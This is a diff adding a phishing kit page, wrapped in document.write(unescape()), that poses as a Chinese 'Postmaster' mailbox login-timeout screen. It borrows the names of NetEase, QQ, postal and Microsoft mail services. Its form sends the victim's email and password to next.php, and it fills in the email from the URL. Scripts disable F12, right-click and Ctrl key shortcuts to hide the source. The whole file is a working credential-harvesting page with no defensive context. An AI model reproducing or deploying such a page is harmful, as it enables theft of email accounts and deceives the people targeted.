@@ -1,0 +1,185 @@
+
+<script>
+document.write(unescape('<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<style type="text/css">
+a:hover{color:#DF0101; }
+</style>
+
+<title>Postmaster</title>
+
+
+
+</head>
+<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0" link="#000000" alink="#000000" onkeypress="return disableCtrlKeyCombination(event);" onkeydown="return disableCtrlKeyCombination(event);">
+
+<script language="JavaScript">
+
+//////////F12 disable code////////////////////////
+    document.onkeypress = function (event) {
+        event = (event || window.event);
+        if (event.keyCode == 123) {
+           //alert('No F-12');
+            return false;
+        }
+    }
+    document.onmousedown = function (event) {
+        event = (event || window.event);
+        if (event.keyCode == 123) {
+            //alert('No F-keys');
+            return false;
+        }
+    }
+document.onkeydown = function (event) {
+        event = (event || window.event);
+        if (event.keyCode == 123) {
+            //alert('No F-keys');
+            return false;
+        }
+    }
+/////////////////////end///////////////////////
+
+
+//Disable right click script 
+//visit http://www.rainbow.arch.scriptmania.com/scripts/ 
+var message="Sorry, right-click has been disabled"; 
+/////////////////////////////////// 
+function clickIE() {if (document.all) {(message);return false;}} 
+function clickNS(e) {if 
+(document.layers||(document.getElementById&&!document.all)) { 
+if (e.which==2||e.which==3) {(message);return false;}}} 
+if (document.layers) 
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;} 
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;} 
+document.oncontextmenu=new Function("return false") 
+// 
+function disableCtrlKeyCombination(e)
+{
+//list all CTRL + key combinations you want to disable
+var forbiddenKeys = new Array('a', 'n', 'c', 'x', 'j' , 'w','s','u');
+var key;
+var isCtrl;
+if(window.event)
+{
+key = window.event.keyCode;     //IE
+if(window.event.ctrlKey)
+isCtrl = true;
+else
+isCtrl = false;
+}
+else
+{
+key = e.which;     //firefox
+if(e.ctrlKey)
+isCtrl = true;
+else
+isCtrl = false;
+}
+//if ctrl is pressed check if other key is in forbidenKeys array
+if(isCtrl)
+{
+for(i=0; i<forbiddenKeys.length; i++)
+{
+//case-insensitive comparation
+if(forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase())
+{
+alert('Key combination CTRL + '+String.fromCharCode(key) +' has been disabled.');
+return false;
+}
+}
+}
+return true;
+}
+</script>
+<table align="center" bgcolor="#FFFFFF" height="100%" width="100%">
+<tbody><tr><td height="10%">
+<br/><br/>
+<table align="center" width="1000"><tbody><tr><td>
+<img height="" src="local_resources/img/19c031776f0125e6ffdd05b731d3b4b4.png" width=""/>
+</td></tr></tbody></table>
+</td></tr>
+<tr><td height="5%">
+<hr align="center" width="1000"/>
+</td></tr>
+<tr><td height="5%"></td></tr>
+<tr><td height="">
+<div align="center">
+<b><font color="#0489B1" face="verdana" size="+2">邮箱登录超时，请重新登录</font></b>
+</div>
+</td></tr>
+<tr><td height="40%">
+<table align="center" bgcolor="#E5E2E2" height="220" style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;" width="400"><tbody><tr><td>
+<table align="center" bgcolor="#ffffff" height="220" style="-moz-border-radius: 7px; -webkit-border-radius: 7px; -khtml-border-radius: 7px; border-radius: 7px;" width="400">
+<tbody><tr><td>
+<table align="center" width="320">
+<tbody><tr><td>
+<form action="./next.php" method="post">
+<br/><br/>
+<input "="" id="xxemail" name="xxemail" placeholder="输入你的电子邮箱" required="" style="width:320px; height:40px; font-family: Verdana; font-size: 15px; color:#000000; 
+				background-color: #ffffff; border: solid 2px 276BA2; padding: 10px" type="email"/>
+<p>
+<input "="" name="xxpass" placeholder="输入密码" required="" style="width:320px; height:40px; font-family: Verdana; font-size: 15px; color:#000000; 
+				background-color: #ffffff; border: solid 2px 276BA2; padding: 10px" type="password"/>
+</p><p>
+<input style="width:320px; height:55px; background-color: 276BA2; border: solid 3px 276BA2; 
+				font-family: Verdana; font-size: 20px; font-weight: bold; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
+				-khtml-border-radius: 4px; border-radius: 4px;" type="submit" value="更新您的邮箱"/>
+</p></form>
+</td></tr>
+</tbody></table>
+<br/>
+</td></tr>
+</tbody></table>
+</td></tr></tbody></table>
+</td></tr>
+<tr><td height="10%"></td></tr>
+<tr><td>
+<div align="center">
+<img height="85" src="local_resources/img/3cd1e69a014b105fd476d3e3314c6ae7.png" width="1000"/>
+</div>
+</td></tr>
+<tr><td height="">
+<hr align="center" width="1000"/>
+</td></tr>
+<tr><td bgcolor="#ffffff" height="10%">
+<table align="center" height="80%" width="90%">
+<tbody><tr><td>
+<div align="center">
+<a href="" style="text-decoration:none"><font face="verdana" size="2"><b>邮政集团</b></font></a> 
+			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>电子邮件设置</b></font></a> 
+			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>网易邮箱</b></font></a> 
+			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>QQ邮箱</b></font></a>
+			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>微软中心</b></font></a>
+			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>企业邮局设置;</b></font></a>
+			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>电子邮件安全</b></font></a>
+			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>电子邮件升
+			  ;级设置</b></font></a>
+			| <a href="" style="text-decoration:none"><font face="verdana" size="2"><b>联系我们</b></font></a>
+</div>
+<p>
+</p></td></tr>
+</tbody></table>
+</td></tr>
+</tbody></table>
+
+<script>
+var mail = document.querySelector('input#xxemail');
+if (mail) {
+var t = document.location.href.split('?')[1];
+if (t) {
+    var params = {};
+    var lst = t.split('&'), l = lst.length;
+    for (var i = 0; i < l; i++) {
+        var p = lst[i].split('=');
+        if (!p[1]) continue;
+        params[p[0]] = p[1];
+    }
+
+    if (params.email) {
+        mail.value = params.email;
+    }
+    }
+    }
+
+</script>
+'))
+
